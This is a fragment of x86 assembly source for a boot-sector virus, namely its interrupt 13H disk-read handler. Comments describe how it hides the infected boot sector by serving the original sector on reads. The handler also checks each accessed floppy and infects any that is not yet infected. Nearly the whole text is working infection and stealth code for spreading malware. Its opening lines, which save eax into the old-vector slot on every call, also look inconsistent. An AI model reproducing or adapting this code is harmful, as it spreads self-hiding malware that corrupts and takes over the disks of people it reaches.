;*******************************************************************************
;* INTERRUPT 13H HANDLER                                                       *
;*******************************************************************************

ORIG13H DD      ?                       ;Old interrupt 13H vector goes here

INT_13H:
        mov     cs:[ORIG13H],eax        ;save address of std Int 13H handler
        mov     eax,ebx
        shr     eax,16                  ;and restore eax
        sti
        cmp     ah,2                    ;we want to intercept reads
        jz      READ_FUNCTION
I13R:   jmp     DWORD PTR cs:[ORIG13H]

;*******************************************************************************
;This section of code handles all attempts to access the Disk BIOS Function 2.
;It stealths the boot sector on both hard disks and floppy disks, by
;re-directing the read to the original boot sector. It handles multi-sector
;reads properly, by dividing the read into two parts. If an attempt is
;made to read the boot sector on the floppy, and the motor is off, this
;routine will check to see if the floppy has been infected, and if not, it
;will infect it.
READ_FUNCTION:                                  ;Disk Read Function Handler
        cmp     dh,0                            ;is it a read on head 0?
        jnz     ROM_BIOS                        ;nope, we're not interested
        cmp     dl,80H                          ;is this a hard disk read?
        jc      READ_FLOPPY                     ;no, go handle floppy

ROM_BIOS:                                       ;jump to ROM BIOS disk handler
        jmp     DWORD PTR cs:[ORIG13H]


;This handles reading from the floppy, which is a bit more complex. For one,
;we can't know where the original boot sector is, unless we first read the
;viral one and get that information out of it. Secondly, a multi-sector
;read must return with the FAT in the second sector, etc.
READ_FLOPPY:
        cmp     cx,1                            ;is it cylinder 0, sector 1?
        jnz     ROM_BIOS                        ;no, let BIOS handle it
        mov     cs:[CURR_DISK],dl               ;save currently accessed drive #
        call    CHECK_DISK                      ;is floppy already infected?
        jz      FLOPPY_STEALTH                  ;yes, stealth the read
                                                ;no
        call    INIT_FAT_MANAGER                ;initialize FAT management routines
        call    INFECT_FLOPPY                   ;go infect the diskette
RF2:    call    CHECK_DISK                      ;see if infection took
        jnz     ROM_BIOS                        ;no, no stealth required, go to BIOS

;If we get here, we need stealth.
FLOPPY_STEALTH:
        pushf
        call    DWORD PTR cs:[ORIG13H]          ;read requested sectors
        mov     cs:[REPORT],ax                  ;save returned ax value here
        jnc     BOOT_SECTOR                     ;and read boot sec if no error
        mov     al,0                            ;error, return with al=0
        retf    2                               ;and carry set

;This routine reads the original boot sector.
BOOT_SECTOR:
        mov     cx,WORD PTR es:[bx + 3EH]       ;cx, dh locate start of
        mov     dh,BYTE PTR es:[bx + 41H]       ;main body of virus
        add     cl,VIR_SIZE                     ;update to find orig boot sec
        cmp     cl,BYTE PTR es:[bx+18H]         ;this procedure works
        jbe     BS1                             ;as long as
        sub     cl,BYTE PTR es:[bx+18H]         ;VIR_SIZE<=BS_SECS_PER_TRACK
        xor     dh,1
        jnz     BS1
        inc     ch
BS1:    mov     ax,201H                         ;read original boot sector
        pushf
        call    DWORD PTR cs:[ORIG13H]
        mov     cx,1                            ;restore cx and dh
        mov     dh,0
        jc      EXNOW                           ;error, exit now
        mov     ax,cs:[REPORT]
EXNOW:  retf    2                               ;and exit to caller

REPORT  DW      ?                               ;value reported to caller in ax

